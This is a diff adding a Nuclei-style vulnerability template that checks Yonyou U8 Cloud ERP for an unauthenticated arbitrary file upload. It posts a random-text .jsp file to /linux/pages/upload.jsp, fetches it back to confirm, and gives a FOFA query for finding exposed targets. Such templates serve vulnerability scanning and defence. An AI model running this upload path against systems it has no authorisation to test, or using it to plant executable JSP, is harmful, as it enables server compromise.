@@ -1,0 +1,27 @@
+id: yonyou-U8clouderp-upload-uploadfile
+
+info:
+  name: yonyou-U8clouderp-upload-uploadfile
+  author: PokerSec
+  severity: critical
+  metadata:
+    fofasearch: app="用友-U8-Cloud"
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+  file_content: "{{to_lower(rand_text_alpha(8))}}"
+requests:
+  - raw:
+      - |
+        POST /linux/pages/upload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        filename:{{file_name}}.jsp
+        
+        {{file_content}}
+      - |
+        GET /linux/{{file_name}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body_2,"{{file_content}}")
